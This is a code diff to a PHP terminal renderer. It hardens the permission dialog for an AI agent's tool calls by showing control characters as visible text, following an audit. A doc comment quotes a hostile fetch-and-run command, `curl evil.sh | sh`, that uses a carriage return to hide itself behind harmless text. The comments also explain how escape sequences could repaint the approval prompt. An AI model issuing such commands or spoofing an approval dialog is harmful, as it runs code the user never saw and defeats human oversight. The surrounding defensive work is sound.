@@ -409,6 +409,9 @@ final class Renderer
      */
     private const PERMISSION_PROMPT_MAX_ROWS = 8;
 
+    /** Lead of the permission modal's title row, before the tool name. */
+    private const PERMISSION_TITLE_ICON = '🔒 ';
+
     /**
      * The answer keys {@see renderPermissionPrompt()} advertises while the
      * prompt is ARMED, as `[keys, label]` pairs.
@@ -4572,11 +4575,20 @@ final class Renderer
      * The confirm half is the same argument in the other direction - `a` no
      * longer grants, so a modal that kept saying it did would read as a bug.
      *
-     * Everything shown here is untrusted: a hook's message and a tool call's
-     * arguments are both model-authored text, so both go through
-     * {@see Sanitize::untrusted()} before reaching the terminal - a prompt
-     * that could smuggle ESC sequences would let the very call being gated
-     * repaint the dialog asking about it.
+     * Everything shown here is untrusted: a hook's message, a tool call's
+     * name and its arguments are all model-authored text. Unlike every other
+     * row in the frame, nothing of it is STRIPPED: this is a gate, and its
+     * rule is that every byte shows as visible text (audit 15b-19). A strip
+     * still displays something other than what will run - `\x1b[8m` (SGR
+     * concealed) vanishes without a trace, and a kept CR let
+     * `curl evil.sh | sh #\recho 'hello world'` repaint its dangerous half
+     * with the harmless one, so the user approved a command they never saw.
+     * So the body goes through {@see wrapPermissionText()} (CR to a row
+     * break, every other control as caret / `<U+00XX>` text via
+     * {@see Sanitize::visibleControls()}, then a cell-counted wrap) and the
+     * title through {@see permissionTitle()} (the same policy folded to one
+     * row). Either way no ESC, C1 or CR reaches the terminal, so the call
+     * being gated cannot repaint the dialog asking about it.
      */
     private static function renderPermissionPrompt(Chat $chat, Theme $theme): string
     {
@@ -4593,7 +4605,10 @@ final class Renderer
 
         $lines = [
             Style::new()->foreground($theme->userLabel)->bold()
-                ->render('🔒 ' . Sanitize::untrusted($call->name)),
+                ->render(self::PERMISSION_TITLE_ICON . self::permissionTitle(
+                    $call->name,
+                    $inner - Width::of(self::PERMISSION_TITLE_ICON),
+                )),
             Style::new()->foreground($theme->assistantLabel)
                 ->render(self::wrapPermissionText(Message::describeToolCall($call), $inner)),
         ];
@@ -4614,7 +4629,7 @@ final class Renderer
             $lines[] = '';
             $lines[] = Style::new()->foreground($theme->userLabel)->bold()->render(
                 self::wrapPermissionText(
-                    'Allow every later ' . $call->name . ' call this session?',
+                    'Allow every later ' . self::permissionVisibleOneLine($call->name) . ' call this session?',
                     $inner,
                 ),
             );
@@ -4720,29 +4735,38 @@ final class Renderer
     }
 
     /**
-     * Sanitize, hard-wrap and clip free text for the permission modal.
+     * Make free text visible, hard-wrap it by cells and clip it for the
+     * permission modal.
+     *
+     * Visible, not sanitized-by-removal ({@see renderPermissionPrompt()} has
+     * the why): CRLF and lone CR become row breaks so both halves of a
+     * CR-overwrite show on their own rows, every other control is rendered
+     * as text by {@see permissionVisible()}, and invalid UTF-8 becomes
+     * U+FFFD. Escape sequences thereby read as inert `^[[31m`.
      *
      * Wrapping happens here rather than being left to `Style::width()`
      * because that pads short lines to the modal width but does not break
      * long ones, and a single over-wide row inside a bordered box breaks the
      * border and (per the fixed-viewport clipping in {@see render()}) the
-     * row accounting around it. `wordwrap()`'s cut flag is on so an unbroken
-     * token - a long path or a base64 blob in a tool argument - wraps
-     * instead of running off the edge.
+     * row accounting around it. {@see Width::wrap()} counts terminal CELLS
+     * per grapheme cluster and hard-breaks an unbroken token - a long path or
+     * a base64 blob in a tool argument - between clusters. It replaced
+     * `wordwrap()`, which counts BYTES and with its cut flag split UTF-8
+     * sequences: 80 CJK characters at 40 columns came back as invalid UTF-8
+     * in rows of 4, 26 and 24 cells (audit 15b-19).
+     *
+     * `$cols` is floored at 2 because a wide (2-cell) cluster cannot fit one
+     * column at all, and {@see Width::wrap()}'s hard-break loop never
+     * advances on a cluster wider than its budget. Callers pass far more.
      */
     private static function wrapPermissionText(string $text, int $cols): string
     {
-        $clean = trim(Sanitize::untrusted($text));
+        $clean = trim(self::permissionVisible(str_replace(["\r\n", "\r"], "\n", $text)));
         if ($clean === '') {
             return '';
         }
 
-        $rows = [];
-        foreach (explode("\n", $clean) as $line) {
-            foreach (explode("\n", wordwrap($line, $cols, "\n", true)) as $wrapped) {
-                $rows[] = $wrapped;
-            }
-        }
+        $rows = explode("\n", Width::wrap($clean, max(2, $cols)));
 
         if (count($rows) > self::PERMISSION_PROMPT_MAX_ROWS) {
             $hidden = count($rows) - self::PERMISSION_PROMPT_MAX_ROWS;
@@ -4751,6 +4775,68 @@ final class Renderer
         }
 
         return implode("\n", $rows);
+    }
+
+    /**
+     * The modal's "every byte is visible" transform for text that keeps its
+     * line breaks: {@see Sanitize::visibleControls()} (UTF-8 repair, C0/DEL
+     * as caret notation, C1 as `<U+00XX>`), TAB expanded to
+     * {@see Width::TAB_WIDTH} spaces, and the zone sentinels spelled out.
+     *
+     * TAB is expanded rather than shown as `^I` because it is ordinary layout
+     * in a quoted script, and a raw TAB would jump to the terminal's next tab
+     * stop - a column the wrap cannot know - so a row could overrun the box.
+     *
+     * The zone sentinels (U+E000/U+E001) are Private-Use TEXT to candy-core,
+     * so {@see Sanitize::visibleControls()} keeps them; raw, they would forge
+     * candy-mouse zone markup inside the modal. Every other row in the frame
+     * strips them ({@see untrusted()}), but this one spells them as
+     * `<U+E000>`/`<U+E001>`, the same codepoint form as C1: stripping an
+     * invisible character still splices the text either side of it, so the
+     * row would show `/tmp` for an argument that is really `/<U+E000>tmp`,
+     * and a gate must not show anything other than what will run.
+     */
+    private static function permissionVisible(string $text): string
+    {
+        return str_replace(
+            ["\t", Sanitize::ZONE_SENTINEL_OPEN, Sanitize::ZONE_SENTINEL_CLOSE],
+            [str_repeat(' ', Width::TAB_WIDTH), '<U+E000>', '<U+E001>'],
+            Sanitize::visibleControls($text),
+        );
+    }
+
+    /**
+     * {@see permissionVisible()} folded to ONE row for values embedded in a
+     * single line (the title, the confirm question): TAB, LF and CR are shown
+     * as `^I`, `^J` and `^M` like every other control
+     * ({@see Sanitize::visibleControls()} with layout off). Shown rather than
+     * folded to a space because a tool name has no business carrying any of
+     * them, and a gate should make that visible rather than tidy it away.
+     */
+    private static function permissionVisibleOneLine(string $text): string
+    {
+        return str_replace(
+            [Sanitize::ZONE_SENTINEL_OPEN, Sanitize::ZONE_SENTINEL_CLOSE],
+            ['<U+E000>', '<U+E001>'],
+            Sanitize::visibleControls($text, false),
+        );
+    }
+
+    /**
+     * The modal's title: the tool name through {@see permissionVisibleOneLine()},
+     * cut to `$room` cells with a trailing `…` when it does not fit, so the
+     * title can neither break into a second row nor overrun the box, and a
+     * cut name still says that it was cut.
+     */
+    private static function permissionTitle(string $name, int $room): string
+    {
+        $visible = self::permissionVisibleOneLine($name);
+        $room = max(1, $room);
+        if (Width::of($visible) <= $room) {
+            return $visible;
+        }
+
+        return Width::truncate($visible, $room - 1) . '…';
     }
 
     /**
